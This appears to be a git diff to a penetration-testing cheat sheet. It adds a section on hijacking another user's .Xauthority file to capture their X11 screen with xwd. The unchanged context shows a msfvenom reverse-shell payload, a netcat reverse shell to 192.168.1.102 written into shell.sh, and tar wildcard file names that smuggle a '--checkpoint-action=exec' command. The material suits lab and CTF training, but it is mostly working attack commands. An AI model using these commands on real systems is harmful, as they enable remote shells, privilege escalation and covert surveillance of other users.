@@ -7,8 +7,8 @@
 		- [SNMP Port 161](#snmp-port-161)
 		- [Web Port 80, 443](#web-port-80-443)
 			- [FeroxBuster](#feroxbuster)
-		- [MySQL Port 3306 & MsSQL Port 1433](#mysql-port-3306--mssql-port-1433)
-		- [SMB Port 445,139 & RPC Port 111,135](#smb-port-445139--rpc-port-111135)
+		- [MySQL Port 3306 \& MsSQL Port 1433](#mysql-port-3306--mssql-port-1433)
+		- [SMB Port 445,139 \& RPC Port 111,135](#smb-port-445139--rpc-port-111135)
 	- [SHELL](#shell)
 		- [Stable Shell](#stable-shell)
 		- [Reverse shell](#reverse-shell)
@@ -50,6 +50,7 @@
 	- [XML external entity (XXE) injection](#xml-external-entity-xxe-injection)
 	- [PING](#ping)
 	- [TAR Wildcards](#tar-wildcards)
+	- [XAuthority / X11 dump](#xauthority--x11-dump)
 	- [Websites](#websites)
 
 ## Scan
@@ -499,6 +500,52 @@ msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.10 lport=8888 R
 echo "mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
 echo "" > "--checkpoint-action=exec=sh shell.sh"
 echo "" > --checkpoint=1
+```
+
+## XAuthority / X11 dump
+
+If you have access to the .Xauthority from another user
+
+- Set it for your current user
+
+```bash
+XAUTHORITY=/tmp/.Xauthority
+export XAUTHORITY
+xauth list
+```
+
+- Check who is connected
+
+```bash
+w
+
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+ross     tty7     :0               Fri06    2days  5:38   0.14s /usr/libexec/gnome-session-binary --systemd --session=gnome
+```
+
+- Dump his screen
+
+```bash
+xwd -root -screen -silent -display :0 -out dump
+```
+
+```bash
+-display display
+    This argument allows you to specify the server to connect to; see x(7).
+-out file
+    This argument allows the user to explicitly specify the output file on the command line. The default is to output to standard out.
+-root
+    This option indicates that the root window should be selected for the window dump, without requiring the user to select a window with the pointer.
+-screen
+    This option indicates that the GetImage request used to obtain the image should be done on the root window, rather than directly on the specified window. In this way, you can obtain pieces of other windows that overlap the specified window, and more importantly, you can capture menus or other popups that are independent windows but appear over the specified window.
+-silent
+    Operate silently, i.e. don't ring any bells before and after dumping the window.
+```
+
+- Open the dump
+
+```bash
+xwud -in dump
 ```
 
 ## Websites
